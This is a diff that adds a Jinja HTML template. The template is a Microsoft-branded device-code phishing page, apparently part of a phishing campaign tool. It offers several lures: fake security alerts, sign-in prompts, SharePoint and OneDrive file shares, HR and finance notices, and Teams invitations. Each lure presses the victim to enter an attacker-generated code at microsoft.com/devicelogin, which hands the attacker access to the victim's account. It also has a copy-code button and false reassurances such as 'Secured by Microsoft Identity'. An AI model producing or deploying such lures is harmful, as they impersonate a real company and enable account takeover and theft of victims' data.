@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>{{ campaign.sender_name or 'Microsoft' }} – {{ campaign.document_title or 'Document' }}</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        /* ===== BASE STYLES ===== */
+        body {
+            background: #f0f2f5;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 520px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            padding: 32px 36px;
+            text-align: center;
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .logo svg { width: 32px; height: 32px; }
+        .logo-text {
+            font-size: 26px;
+            font-weight: 600;
+            color: #0b57d0;
+        }
+        .code-box {
+            background: #f0f4f9;
+            border-radius: 8px;
+            padding: 14px;
+            margin: 16px 0;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 4px;
+            color: #0b57d0;
+            word-break: break-all;
+        }
+        .btn-primary {
+            background: #0b57d0;
+            border: none;
+            padding: 10px 20px;
+            font-weight: 600;
+            border-radius: 6px;
+            text-decoration: none;
+            color: #fff;
+            display: inline-block;
+        }
+        .btn-primary:hover { background: #094ab8; }
+        .btn-outline-secondary {
+            background: transparent;
+            border: 1px solid #d0d7de;
+            color: #3d4a5a;
+            padding: 6px 16px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+        }
+        .btn-outline-secondary:hover { background: #f0f2f5; }
+        .footer {
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #5b6b7c;
+        }
+        .footer a { color: #0b57d0; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .file-meta {
+            background: #f5f7fa;
+            border-left: 4px solid #0b57d0;
+            padding: 12px 16px;
+            margin: 12px 0;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .file-meta .info { flex: 1; }
+        .file-meta .info .name { font-weight: 600; color: #1a1a2e; }
+        .file-meta .info .meta { font-size: 0.75rem; color: #5b6b7c; }
+        .exit-link {
+            display: inline-block;
+            margin-top: 8px;
+            color: #0b57d0;
+            text-decoration: none;
+        }
+        .exit-link:hover { text-decoration: underline; }
+        .description {
+            color: #5b6b7c;
+            font-size: 0.85rem;
+            margin-top: -4px;
+            margin-bottom: 12px;
+        }
+        /* ===== TEMPLATE-SPECIFIC STYLES ===== */
+        /* Security Alert */
+        .security-banner {
+            background: #fce4e4;
+            border: 1px solid #e53935;
+            border-radius: 6px;
+            padding: 10px;
+            color: #b71c1c;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        .security-banner i { margin-right: 6px; }
+        /* Sign-in / Verification */
+        .signin-subtitle {
+            color: #5b6b7c;
+            font-size: 0.9rem;
+        }
+        .signin-footer {
+            margin-top: 16px;
+            padding-top: 12px;
+            border-top: 1px solid #e9edf2;
+            font-size: 0.7rem;
+            color: #5b6b7c;
+        }
+        /* SharePoint / File share */
+        .sharepoint-card {
+            background: #f8fafc;
+            border-radius: 6px;
+            padding: 16px;
+            margin: 12px 0;
+            text-align: left;
+            border-left: 4px solid #0b57d0;
+        }
+        .sharepoint-card .shared-by {
+            font-size: 0.85rem;
+            color: #5b6b7c;
+        }
+        .sharepoint-card .file-name {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 4px 0;
+        }
+        .sharepoint-card .file-meta {
+            font-size: 0.75rem;
+            color: #5b6b7c;
+        }
+        /* Corporate */
+        .corporate-header {
+            color: #1a1a2e;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container { padding: 20px; }
+            .code-box { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- ===== BRAND LOGO ===== -->
+    <div class="logo">
+        <svg viewBox="0 0 24 24" fill="#0b57d0">
+            <path d="M11.5 2H2.5v9h9V2zm0 11h-9v9h9v-9zm11-11h-9v9h9V2zm0 11h-9v9h9v-9z"/>
+        </svg>
+        <span class="logo-text">Microsoft</span>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- DYNAMIC CONTENT BASED ON TEMPLATE ID / CATEGORY              -->
+    <!-- ============================================================ -->
+    {% set template_id = template.id if template else 'default' %}
+    {% set category = template.category if template else 'Microsoft' %}
+
+    <!-- ===== CASE 1: SECURITY ALERT ===== -->
+    {% if template_id in ['ms_security', 'ms_alert', 'ms_password_reset', 'security_alert'] %}
+        <div class="security-banner">
+            <i class="bi bi-shield-exclamation"></i> Security Alert – Action Required
+        </div>
+        <h2>{{ campaign.document_title or 'Security Alert' }}</h2>
+        <p class="description">{{ template.description or 'Unusual sign-in activity detected' }}</p>
+        <p style="font-size:0.9rem; color:#5b6b7c;">To verify your identity, enter the code below.</p>
+        <div class="code-box">{{ user_code }}</div>
+        <p style="font-size:0.9rem;">Open <strong>microsoft.com/devicelogin</strong> and enter this code.</p>
+        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn-primary">Go to microsoft.com/devicelogin</a>
+        <button onclick="copyCode()" class="btn-outline-secondary" style="display:block; width:100%; margin-top:10px;">📋 Copy Code</button>
+        <div class="footer">
+            <p>If you didn't request this, you can ignore this message.</p>
+            <p><a href="{{ exit_url }}" class="exit-link">Continue to {{ campaign.document_title or 'Microsoft' }}</a></p>
+        </div>
+
+    <!-- ===== CASE 2: SIGN-IN / VERIFICATION ===== -->
+    {% elif template_id in ['ms_signin', 'direct', 'account_verification', 'ms_copilot'] %}
+        <h2>{{ campaign.document_title or 'Sign in' }}</h2>
+        <p class="signin-subtitle">{{ template.description or 'Use this code to sign in to your account' }}</p>
+        <div class="code-box">{{ user_code }}</div>
+        <button onclick="copyCode()" class="btn-outline-secondary" style="margin-bottom:10px;">📋 Copy</button>
+        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn-primary">Sign in</a>
+        <div class="signin-footer">
+            🔒 Your sign-in is secured by Microsoft<br>
+            Code expires in 15 minutes
+        </div>
+
+    <!-- ===== CASE 3: SHAREPOINT / ONEDRIVE / GOOGLE DRIVE (file share) ===== -->
+    {% elif template_id in ['sharepoint', 'onedrive', 'google_drive'] %}
+        <h2>{{ template.name or 'Document' }}</h2>
+        <div class="sharepoint-card">
+            <div class="shared-by">
+                <strong>{{ campaign.sender_name or 'SharePoint' }}</strong> has shared a document with you.
+            </div>
+            <div class="file-name">{{ campaign.document_title or 'Document' }}{{ campaign.document_type or '' }}</div>
+            <div class="file-meta">Shared on {{ now.strftime('%B %d, %Y') if now else 'today' }} · 2.4 MB</div>
+        </div>
+        <p style="font-size:0.9rem;">Use the one‑time code below to securely sign in from a trusted browser.</p>
+        <div class="code-box">{{ user_code }}</div>
+        <p style="font-size:0.9rem;">Enter this code at <strong>microsoft.com/devicelogin</strong></p>
+        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn-primary">Open Document</a>
+        <button onclick="copyCode()" class="btn-outline-secondary" style="display:block; width:100%; margin-top:10px;">📋 Copy Code</button>
+        <div class="footer">
+            <p>If you didn't request this, you can ignore this message.</p>
+            <p><a href="{{ exit_url }}" class="exit-link">Continue to {{ campaign.document_title or 'SharePoint' }}</a></p>
+            <p style="margin-top:8px; border-top:1px solid #e9edf2; padding-top:8px; font-size:0.65rem; color:#5b6b7c;">
+                Secured by Microsoft Identity · Code expires in 15 minutes
+            </p>
+        </div>
+
+    <!-- ===== CASE 4: CORPORATE / HR / FINANCE ===== -->
+    {% elif category in ['Corporate', 'Finance', 'HR & Legal'] %}
+        <div class="corporate-header">🏢 {{ campaign.document_title or 'Important Notice' }}</div>
+        <p class="description">{{ template.description or 'Please review this document' }}</p>
+        <p style="color:#3d4a5a; font-size:0.9rem;">To view this document, enter the verification code below.</p>
+        <div class="code-box">{{ user_code }}</div>
+        <p style="font-size:0.9rem;">Enter this code at <strong>microsoft.com/devicelogin</strong></p>
+        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn-primary">Continue</a>
+        <button onclick="copyCode()" class="btn-outline-secondary" style="display:block; width:100%; margin-top:10px;">📋 Copy Code</button>
+        <div class="footer">
+            <p>If you didn't request this, you can ignore this message.</p>
+            <p><a href="{{ exit_url }}" class="exit-link">Continue to {{ campaign.document_title or 'Company' }}</a></p>
+        </div>
+
+    <!-- ===== CASE 5: TEAMS / OUTLOOK / PLANNER (collaboration) ===== -->
+    {% elif category in ['Collaboration', 'Communication'] or template_id in ['ms_teams_meeting', 'outlook', 'ms_planner', 'ms_teams_approval'] %}
+        <h2>{{ campaign.document_title or 'Meeting Invitation' }}</h2>
+        <p class="description">{{ template.description or 'You have a new meeting invitation' }}</p>
+        <div style="background:#f0f4f9; border-radius:6px; padding:12px; margin:12px 0; text-align:left;">
+            <div><strong>From:</strong> {{ campaign.sender_name or 'Team' }}</div>
+            <div><strong>Subject:</strong> {{ campaign.document_title }}</div>
+        </div>
+        <p style="font-size:0.9rem;">To join, enter the code below.</p>
+        <div class="code-box">{{ user_code }}</div>
+        <p style="font-size:0.9rem;">Enter this code at <strong>microsoft.com/devicelogin</strong></p>
+        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn-primary">Join</a>
+        <button onclick="copyCode()" class="btn-outline-secondary" style="display:block; width:100%; margin-top:10px;">📋 Copy Code</button>
+        <div class="footer">
+            <p>If you didn't request this, you can ignore this message.</p>
+            <p><a href="{{ exit_url }}" class="exit-link">Continue to {{ campaign.document_title or 'Teams' }}</a></p>
+        </div>
+
+    <!-- ===== CASE 6: FALLBACK (default Microsoft style) ===== -->
+    {% else %}
+        <h2>{{ campaign.document_title or 'Document' }}</h2>
+        <p class="sender"><strong>{{ campaign.sender_name or 'Microsoft' }}</strong> has shared a document with you.</p>
+        {% if template and template.description %}
+            <p class="description">{{ template.description }}</p>
+        {% endif %}
+        <p style="font-size:0.9rem; color:#5b6b7c; margin-bottom:8px;">
+            To view this document, enter the code below on your device.
+        </p>
+        <div class="code-box">{{ user_code }}</div>
+        <p style="font-size:0.9rem;">
+            Open <strong>microsoft.com/devicelogin</strong> on your device and enter this code.
+        </p>
+        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn-primary">Go to microsoft.com/devicelogin</a>
+        <button onclick="copyCode()" class="btn-outline-secondary" style="display:block; width:100%; margin-top:10px;">📋 Copy Code</button>
+        <div class="file-meta">
+            <span style="font-size:24px;">
+                {% if campaign.document_type == '.PDF' %}📄
+                {% elif campaign.document_type == '.DOCX' %}📝
+                {% elif campaign.document_type == '.XLSX' %}📊
+                {% elif campaign.document_type == '.PPTX' %}📽️
+                {% else %}📁{% endif %}
+            </span>
+            <div class="info">
+                <div class="name">{{ campaign.document_title or 'Document' }}{{ campaign.document_type or '' }}</div>
+                <div class="meta">Shared on {{ now.strftime('%B %d, %Y') if now else 'today' }} · 2.4 MB</div>
+            </div>
+        </div>
+        <div class="footer">
+            <p style="margin-bottom:4px;">If you didn't request this, you can ignore this message.</p>
+            <p><a href="{{ exit_url }}" class="exit-link">Continue to {{ campaign.document_title or 'Microsoft' }}</a></p>
+            <p style="margin-top:10px; border-top:1px solid #e9edf2; padding-top:10px;">
+                This link will expire after authentication.
+            </p>
+        </div>
+    {% endif %}
+
+</div>
+
+<script>
+    function copyCode() {
+        const code = document.querySelector('.code-box').innerText;
+        navigator.clipboard.writeText(code).then(() => {
+            alert('✅ Code copied!');
+        }).catch(() => {
+            const textarea = document.createElement('textarea');
+            textarea.value = code;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            alert('✅ Code copied!');
+        });
+    }
+</script>
+</body>
+</html>
